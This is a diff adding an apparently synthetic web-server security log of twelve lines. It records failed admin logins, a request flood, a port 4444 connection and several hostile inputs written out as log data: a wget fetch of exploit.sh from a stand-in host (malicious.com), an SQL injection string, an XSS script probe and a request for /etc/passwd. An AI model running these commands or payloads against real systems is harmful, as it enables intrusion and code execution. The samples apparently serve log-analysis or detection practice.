@@ -1,0 +1,12 @@
+[2026-08-18 12:34:56] Failed login attempt for user 'admin' from IP 192.168.1.10
+[2026-08-18 12:34:57] Failed login attempt for user 'admin' from IP 192.168.1.10
+[2026-08-18 12:34:58] Failed login attempt for user 'admin' from IP 192.168.1.10
+[2026-08-18 13:45:23] SQL query error: SELECT * FROM users WHERE username='' OR '1'='1'; -- ' AND password='password'
+[2026-08-18 14:56:12] GET /login HTTP/1.1 User-Agent: Possible-Scanning-Bot/1.0
+[2026-08-18 15:23:45] GET /admin/dashboard HTTP/1.1 from IP 203.0.113.5
+[2026-08-18 16:34:12] Command executed: /bin/bash -c 'wget http://malicious.com/exploit.sh'
+[2026-08-18 17:45:23] GET /etc/passwd HTTP/1.1 from IP 192.168.1.20
+[2026-08-18 18:56:34] 1000 requests received from IP 192.168.1.30 in the last 60 seconds
+[2026-08-18 19:12:45] GET /search?q=<script>alert('XSS')</script> HTTP/1.1
+[2026-08-18 20:23:56] Connection attempt to port 4444 from IP 192.168.1.40
+[2026-08-18 21:34:12] GET /downloads/malicious.exe HTTP/1.1 from IP 192.168.1.50
